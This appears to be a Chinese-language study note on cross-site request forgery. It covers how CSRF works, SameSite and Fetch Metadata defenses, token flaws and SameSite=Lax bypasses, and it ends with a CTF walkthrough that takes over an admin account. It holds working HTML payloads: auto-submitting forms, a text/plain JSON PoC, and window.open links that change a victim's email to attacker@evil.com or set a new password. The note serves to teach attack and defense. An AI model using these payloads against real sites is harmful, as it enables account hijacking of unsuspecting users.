# 前端安全-CSRF

## 一句话理解
CSRF（Cross-site Request Forgery，跨站请求伪造）是攻击者诱导受害者浏览器在已登录状态下，向目标站点发送“用户本人并未主动发起”的请求。

## 核心原理
浏览器会自动携带和目标站点相关的认证信息，例如 Cookie、部分浏览器凭据、已建立的会话状态。  
如果服务端只校验“请求是否带着有效登录态”，而不校验“请求是否确实由本站页面发起”，就可能出现 CSRF。

## 现代浏览器视角
### 1. Site 和 Origin 不是一回事
- `Origin`：协议 + 主机 + 端口
- `Site`：更偏向同站概念，通常围绕可注册域名判断

这点很关键，因为：
- 两个请求可能不同源，但仍然同站
- `SameSite` 防护看的是站点关系，不是同源关系
- 同站子域一旦存在 XSS、接管或弱点，可能反过来影响主站的 CSRF 边界

### 2. 现在很多浏览器默认就是 `SameSite=Lax`
这意味着老式“跨站自动提交 POST 表单”在现代浏览器中不一定还能稳定成功。  
但这不代表 CSRF 已经消失，下面这些情况仍然常见：
- 业务主动把认证 Cookie 设成 `SameSite=None; Secure`
- 同站子域之间可发起 same-site 请求
- 敏感操作错误地保留为 GET
- 老旧浏览器、嵌入式环境或兼容性场景
- OAuth、SSO、跨站嵌入能力引入了新的请求链

## 与 XSS 的区别
- XSS 利用的是用户对站点的信任
- CSRF 利用的是站点对用户浏览器的信任

XSS 一旦成立，往往还能反过来窃取 CSRF Token 或直接调用站内接口，因此很多场景里 XSS 的优先级高于单纯的 CSRF。

## 成立条件
CSRF 通常需要满足以下条件：
- 受害者已经登录目标站点
- 浏览器会自动附带有效认证信息
- 目标操作仅依赖 Cookie 或会话状态鉴权
- 攻击者可以构造一个受害者浏览器能发起的请求
- 服务端没有额外校验请求来源或一次性凭证

## 常见攻击面
- 修改个人资料、绑定邮箱、修改手机号
- 修改密码、重置二次验证、添加信任设备
- 发帖、发消息、点赞、关注、加好友
- 转账、下单、收货地址修改
- 管理后台中的新增管理员、授权、导入导出、Webhook 配置

## 常见利用形式
### 1. GET 请求
如果敏感操作被设计成 GET，利用门槛最低：

```html
<img src="https://target.com/user/delete?id=1">
```

或：

```html
<a href="https://target.com/profile/update?role=admin">click</a>
```

### 2. POST 表单自动提交

```html
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
document.forms[0].submit();
</script>
```

### 3. 特定 Content-Type 场景
很多站点以为“只允许 POST + JSON 就安全”，但如果接口也接受表单、文本、宽松解析或参数覆盖，就仍可能被构造。

### 3.1 JSON CSRF PoC（text/plain 绕过）
完整可用的 PoC：

```html
<form action="https://target/api" method="POST" enctype="text/plain">
  <input name='{"a":"1","b":"' value='c"}'>
</form>
<script>document.forms[0].submit();</script>
```

**为什么必须用 `text/plain`：**

浏览器原生表单只支持三种 `enctype`：
- `application/x-www-form-urlencoded`（默认）
- `multipart/form-data`
- `text/plain`

跨站 `fetch` 想发 `Content-Type: application/json` 属于非简单请求，会先触发 CORS 预检（OPTIONS），攻击者页面过不了预检，请求根本发不出去。因此**跨站能构造的表单 Content-Type 只有上述三种**，只能赌服务端解析宽松。

**text/plain 的拼接原理：**

以 text/plain 提交时，请求体格式为 `name=value`（每字段一行）。上面 PoC 发出的实际 body：

```text
{"a":"1","b":"=c"}
```

拆解：
- name = `{"a":"1","b":"`
- 分隔符 = `=`
- value = `c"}`

拼起来正好是一段合法 JSON，`=` 被"藏"进了 JSON 的值里。若服务端直接 `json_decode(file_get_contents('php://input'))`、或框架对 Content-Type 宽松解析，就会当成正常 JSON 处理。

**利用条件：**
- 服务端不严格校验 `Content-Type` 必须为 `application/json`
- 接口仅依赖 Cookie 鉴权
- 需要调整 `=` 落点时，移动 name/value 里的引号即可。例如 name=`{"a":"1","b":"c","d":"`、value=`e"}`，body 变成 `{"a":"1","b":"c","d":"=e"}`

**防御侧：** 服务端必须严格校验 `Content-Type`，并要求自定义头或 CSRF Token。任何一种宽松解析，都会让"JSON 接口天然防 CSRF"的假设失效。

### 4. 登录 CSRF
有些业务不是“冒充受害者执行操作”，而是“把受害者悄悄登录进攻击者控制的账号”，从而影响后续操作和数据流向。

### 5. 前后端分离接口
很多接口表面上是 `fetch + JSON`，但是否真抗 CSRF，要看服务端是否满足以下条件：
- 只接受非简单请求
- 必须带自定义头
- 不接受 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`
- 不存在参数污染、方法切换、宽松解析

如果后端既支持 JSON，又兼容表单或文本请求，就仍然可能被降级利用。

## 非简单请求不等于绝对安全
浏览器跨站构造请求时，简单请求更容易直接发起。  
对防守方来说，要求接口必须满足以下一项，会明显提高攻击成本：
- 需要自定义头
- 需要 `application/json`
- 触发 CORS 预检，并由服务端严格限制允许源

但要注意：
- CORS 是“读响应控制”，不是专门的 CSRF 防御
- 如果接口本身接受简单请求内容类型，攻击者仍可能构造可用请求
- 一旦允许跨域且允许带凭据，问题可能从“能发请求”升级成“还能读响应”

## 为什么有些接口不容易被 CSRF
以下机制会显著提高攻击难度：
- 请求必须带不可预测的 CSRF Token
- Token 绑定用户会话且一次一用
- 服务端严格校验 `Origin` / `Referer`
- Cookie 使用 `SameSite`，浏览器不再在跨站请求中自动附带
- 敏感操作要求再次输入密码、短信验证码、二次确认

## 防御思路
防御的本质：要求请求同时携带“攻击者无法伪造或获取的额外凭证”。

### 1. CSRF Token
最常见、也最有效的方案。

关键要求：
- Token 不可预测
- 与用户会话绑定
- 最好与操作场景绑定
- 不要只校验“字段存在”
- 不要多个用户共享同一个 Token

### 2. SameSite Cookie
通过浏览器机制限制跨站请求自动带 Cookie。

常见选项：
- `SameSite=Strict`
- `SameSite=Lax`
- `SameSite=None; Secure`

> 这是一层很重要的浏览器侧防线，但不应替代 Token 校验。

补充理解：
- `Strict` 最严格，但对从外部链接进入站点的体验影响最大
- `Lax` 适合作为默认防线，但对顶层导航类 GET 仍需小心
- `None` 适合确有跨站需求的场景，但必须配合 `Secure`

### 3. 校验 `Origin` / `Referer`
适合作为辅助校验。

优点：
- 实现相对简单
- 对部分无 Token 场景有补充价值

缺点：
- 某些环境下请求头可能缺失
- 不适合作为唯一防线

### 4. 双重 Cookie 校验
思路是：服务端在 Cookie 中放一个值，前端再把同样的值放到请求参数或自定义头中，服务端比对二者是否一致。

适用点：
- 前后端分离场景
- 与 Token 机制组合使用

### 5. 自定义请求头
浏览器跨站表单无法随意添加自定义头，因此接口要求：
- `X-CSRF-Token`
- `X-Requested-With`
- 其他受控头字段

也能提高攻击门槛，但仍建议与 Token 联合使用。

### 6. Fetch Metadata
现代浏览器会自动带上一组 `Sec-Fetch-*` 请求头，服务端可以据此识别请求上下文。  
其中最常用的是：
- `Sec-Fetch-Site: same-origin`
- `Sec-Fetch-Site: same-site`
- `Sec-Fetch-Site: cross-site`
- `Sec-Fetch-Site: none`

实战意义：
- 对 Cookie 鉴权接口，服务端可优先拦截明显的 `cross-site` 状态变更请求
- 适合做现代浏览器环境下的“第一层筛选”
- 仍需为旧浏览器准备 Token 或 `Origin` / `Referer` 兜底策略

### 6.1 Fetch Metadata 校验逻辑与伪代码

`Sec-Fetch-Site` 取值与判定基准：

| 取值 | 含义 | 状态变更请求是否放行 |
| --- | --- | --- |
| `same-origin` | 发起站点与目标同源（协议+域名+端口一致） | 放行 |
| `same-site` | 同站不同源（兄弟子域） | 默认拦截，确有跨子域业务时再放行 |
| `cross-site` | 跨站发起 | 一律拦截（CSRF 的典型特征） |
| `none` | 用户直接发起（地址栏、书签） | 仅 `Sec-Fetch-Mode: navigate` 的 GET 导航放行 |

配套读取的头：
- `Sec-Fetch-Mode`：`navigate`（顶层导航）/ `document`（iframe 加载）/ `cors`（fetch/XHR）
- `Sec-Fetch-Dest`：`document` / `script` / `image` / `empty`（XHR/fetch）
- `Sec-Fetch-User`：`?1` 表示由用户手势触发（如地址栏回车）

服务端校验伪代码（Fetch Metadata 资源分离策略的简化实现）：

```python
def is_csrf_blocked(request):
    # 只拦截"携带凭据的状态变更请求"
    if request.method not in ("POST", "PUT", "DELETE", "PATCH"):
        return False  # 安全方法交给"禁止 GET 改状态"的业务规则
    if not request.has_credentials:
        return False  # 未携带凭据，不属于 CSRF 范畴

    site = request.headers.get("Sec-Fetch-Site")
    mode = request.headers.get("Sec-Fetch-Mode")

    # 头缺失：旧浏览器不支持 Fetch Metadata，交给 Token / Origin 校验兜底
    if site is None:
        return False

    # 同源：放行
    if site == "same-origin":
        return False

    # 用户从地址栏/书签直接导航：放行
    if site == "none" and mode == "navigate":
        return False

    # 其余：same-site / cross-site 的状态变更请求，一律拦截
    return True
```

落地要点：
- 该策略只是"第一层筛选"，必须与 Token、`Origin` 校验共存，为不发送 `Sec-Fetch-*` 的旧浏览器兜底
- 静态资源类 GET（`Sec-Fetch-Dest: image/script/style`）通常放行，否则会误伤正常加载
- 建议在网关 / 框架中间件层统一实现，不要散落在各接口里

### 7. 敏感操作二次确认
例如：
- 重新输入密码
- 短信验证码
- TOTP 校验
- 确认弹窗 + 服务端状态校验

## 常见绕过思路
### 1. Token 校验缺陷
常见问题包括：
- 删除 Token 也能通过
- Token 只校验长度或格式
- Token 在不同用户之间可以共用
- Token 不绑定会话
- Token 长期不变且可预测
- 只校验 Cookie 中的 Token，不校验请求参数中的 Token

排查点：
- 删除令牌：删除参数或 Cookie 中的 Token，观察是否仍能通过
- 令牌共享：创建两个账户，互换 Token 看是否可复用
- 篡改令牌值：看服务端是否仅做弱校验
- 解码令牌：判断是否只是简单编码，如 Base64、MD5 包裹
- 修改请求方法：把 `POST` 改成 `GET` 看服务端是否同样接受

### 2. Token 泄露
虽然 CSRF 的经典前提是“攻击者无法直接读取响应”，但 Token 依然可能通过以下方式泄露：
- XSS
- 开放重定向
- Web 缓存欺骗
- 日志泄露
- Referer 外带
- Clickjacking 配合交互

### 3. `Referer` / `Origin` 校验缺陷
典型错误：
- 只做“包含目标域名”的字符串判断
- 只判断前缀，不做完整主机名校验
- 正则写得过于宽松

例如：
- `http://baidu.com.reabout.com`
- `http://attack.com?http://baidu.com`

### 4. CORS 误配置联动
严格来说 CORS 不是 CSRF 防御机制，但如果：
- 允许任意源跨域
- 允许携带凭据
- 响应里暴露敏感数据

那么问题会升级为“攻击者不仅能发请求，还能读响应”。

### 5. SameSite 认知偏差与绕过
常见误区：
- 以为开了 `SameSite=Lax` 就完全没有 CSRF
- 把“同源”误当成“同站”
- 忽略同父域下的兄弟子域风险

需要重点记住的限制：
- `Lax` 对顶层导航 GET 仍然可能放行
- `SameSite` 主要是防跨站，不防同站子域打同站主域
- 子域接管、同站 XSS、同站开放重定向都可能削弱它的效果

### 5.1 SameSite=Lax 具体绕过手法

前提回顾：`Lax` 下浏览器只允许"**顶层导航 + 安全方法（GET/HEAD）**"携带 Cookie，其余一律不带（iframe 内表单 POST、fetch/XHR POST、子资源加载）。

#### 手法一：Chrome Lax+POST 两分钟宽限窗口（历史特性）
Chrome 80 起 Cookie 默认 `SameSite=Lax`，但为兼容支付等流程留了宽限：**Cookie 刚设置不足 2 分钟时，跨站顶层 POST 也会携带**（Lax-allowing-unsafe）。

利用思路：
1. 先诱导受害者访问目标站任意页面，触发服务端重新下发会话 Cookie（把"Cookie 年龄"刷新到 2 分钟以内）
2. 立即诱导其打开攻击页，跨站顶层 POST 表单马上提交

现状：后续 Chrome 版本已大幅收紧该窗口（Chrome 80-86 稳定存在，之后缩短并逐步移除），属于历史版本与老环境的实用知识点。

#### 手法二：Cookie 崩溃法（Cookie Jar Overflow）
浏览器对单域 Cookie 有数量与大小上限（单条约 4KB、每域数百条，因浏览器而异）。思路：
1. 通过目标的同站子域（任何能写 Cookie 的端点）塞满大量超大 Cookie，把认证 Cookie"挤"出 Cookie 罐
2. 诱导站点重建会话，若重建时 `Set-Cookie` 忘了带 `SameSite`，认证 Cookie 退化为无 SameSite 状态
3. 此时跨站 POST 表单重新可携带

该手法依赖目标站的会话重建逻辑，属于"条件苛刻但真实存在"的绕过路径。

#### 手法三：iframe 发 POST 行不通 → GET 化走顶层导航
`Lax` 下：
- iframe 中加载攻击页再提交 POST 表单：**Cookie 不带**（非顶层导航）
- `fetch` / `XMLHttpRequest` 跨站 POST：**Cookie 不带**

因此只剩"顶层导航 + GET"一条路。若服务端方法可切换（POST 改 GET 也接受），用顶层导航发起：

```html
<script>
  // window.open 产生顶层导航，GET 请求在 Lax 下会自动携带 Cookie
  window.open('https://target.com/api/profile/email?email=attacker@evil.com');
</script>
```

`<a href>`、`location.href`、`<meta http-equiv="refresh">` 等同样能产生顶层 GET 导航。
若接口严格只收 POST：转向手法一、手法二，或找同站子域（手法四）。

#### 手法四：同站发起（不受 Lax 限制）
`SameSite` 判断的是"站点（site）"不是"源（origin）"。攻击者若能控制目标的兄弟子域（子域 XSS、子域接管、可自定义内容的子域服务），从那里发起的请求属于 same-site，`Lax` 与 `Strict` 都拦不住。这是当前实战中最常见的 Lax 绕过面。

### 6. GET 接口做敏感操作
一旦敏感操作被设计成 GET，请求可被非常低成本地嵌入：
- `img`
- `script`
- `iframe`
- `link`

### 7. Client-side CSRF
有些系统表面上“带了 Token”，但前端脚本会从 URL、`location.hash`、`postMessage` 或可控配置中读取请求目标、请求方法、参数，再自动携带当前用户凭据发请求。  
这类问题本质上是“前端被攻击者驱动去发站内合法请求”，也值得单独排查。

重点观察：
- 前端是否把用户可控输入直接拼进 API 路径
- 是否根据 URL 参数动态决定请求方法和参数
- 是否存在能驱动站内请求的前端路由或通用请求器

## 实战排查思路
### 1. 优先找高价值状态变更接口
关注：
- 个人信息修改
- 账户安全设置
- 金融与支付
- 后台权限与配置变更

### 2. 看请求是否只依赖 Cookie
如果无 Token、无来源校验、无二次确认，优先级通常较高。

### 3. 看浏览器侧限制是否存在
重点关注：
- 是否使用 `SameSite`
- 是否校验 `Sec-Fetch-Site`
- 是否必须自定义头
- 是否限制请求类型

### 4. 看是否可由低交互触发
自动提交表单、页面加载即触发的请求，危害通常更高。

### 5. 看是否存在同站联动点
重点排查：
- 兄弟子域是否可控或可接管
- 是否存在同站 XSS
- OAuth / SSO / 跳转链是否会刷新 Cookie
- 是否存在前端路由或脚本 gadget 可发起二次请求

## 案例：CSRF 接管管理员账号（CTF 完整流程）

### 题目背景
某 CTF 站点：普通用户可注册登录，管理员账号 `admin` 登录后可见 flag。攻击者持有一个普通账号，目标是被"借用"管理员身份完成接管。

### 第一步：发现仅 Cookie 鉴权的敏感接口
登录后在"个人设置"页抓包，发现修改邮箱接口：

```http
POST /api/profile/email HTTP/1.1
Host: target.ctf.com
Cookie: session=xxxxx
Content-Type: application/json

{"email":"user1@example.com"}
```

排查确认：
- 请求中**没有** CSRF Token
- 删除 `Referer` / `Origin` 头重放仍返回 200 → 服务端不校验来源
- 无自定义头要求，接口只认 Cookie
- 认证 Cookie 为 `SameSite=Lax`

结论：满足 CSRF 成立条件，唯一障碍是 `SameSite=Lax`。

### 第二步：先试标准 POST 表单 PoC（被 Lax 拦截）
在自己控制的页面构造经典 PoC：

```html
<form action="https://target.ctf.com/api/profile/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

通过题目提供的"举报/反馈给管理员"入口提交该页面链接（admin bot 会访问）触发后，接口返回 401——跨站 POST 的 Cookie 被 `Lax` 拦下。

### 第三步：发现方法切换，改走 GET 化
把请求方法改成 GET 测试：

```http
GET /api/profile/email?email=attacker@evil.com HTTP/1.1
Cookie: session=xxxxx
```

返回 200 且邮箱成功修改——服务端只认参数不看方法，可 GET 化。

### 第四步：构造顶层 GET 导航的最终 PoC

```html
<!-- victim-poc.html：受害者访问本页即触发 -->
<script>
  // window.open 是顶层导航，GET 请求在 SameSite=Lax 下自动携带 Cookie
  window.open('https://target.ctf.com/api/profile/email?email=attacker@evil.com');
</script>
```

### 第五步：借"忘记密码"完成接管
- 通过举报入口把 PoC 页面链接提交给 admin bot
- 管理员访问 PoC → 其绑定邮箱被改为 `attacker@evil.com`
- 在登录页走"忘记密码"，重置链接发到攻击者邮箱 → 重置 `admin` 密码 → 登录拿到 flag

### 备选路径：直接改密
若存在改密接口 `POST /api/profile/password`（只需 `new_password`，不校验旧密码）且方法同样可切换：

```html
<script>
  window.open('https://target.ctf.com/api/profile/password?new_password=P@ssw0rd!');
</script>
```

管理员触发后直接改密登录，无需邮箱链路。

### 复盘要点
- 排查顺序固定：有无 Token → 有无 Origin/Referer 校验 → Cookie 的 SameSite → 方法能否切换
- `SameSite=Lax` 不是终点：POST 被拦时优先测"GET 化 + 顶层导航（window.open / a 标签）"
- 接管链路优先选"改邮箱 → 忘记密码"或"直接改密"，两者都只依赖 Cookie 鉴权
- 若目标严格 POST-only + 严格 Lax，转向同站子域、Lax+POST 宽限窗口、Cookie 崩溃法

## 防御清单
- 敏感操作必须使用 CSRF Token
- Token 必须绑定会话，且不可预测
- 优先使用框架自带的 CSRF 机制，避免自写半成品逻辑
- 优先校验 `Origin`，缺失时再谨慎校验 `Referer`
- 对现代浏览器增加 `Fetch Metadata` 校验
- 认证 Cookie 配置 `SameSite`
- 仅在确有跨站需求时使用 `SameSite=None; Secure`
- 敏感动作避免使用 GET
- 避免同站弱子域影响主站认证边界
- 高风险操作增加二次确认
- 不要让前端缓存、日志、跳转把 Token 带出去

## Reference
- [前端安全系列（二）：如何防止 CSRF 攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)
- [跨站请求伪造（CSRF）挖掘技巧及实战案例全汇总](https://cloud.tencent.com/developer/article/1516424)
- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Cross-site request forgery (CSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
- [MDN Set-Cookie / SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)
- [PortSwigger Web Security Academy - CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger - Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
- [Google Chrome - SameSite cookies explained](https://developer.chrome.com/blog/samesite/)
- [web.dev - Prevent unnecessary network requests with Fetch Metadata](https://web.dev/articles/fetch-metadata)
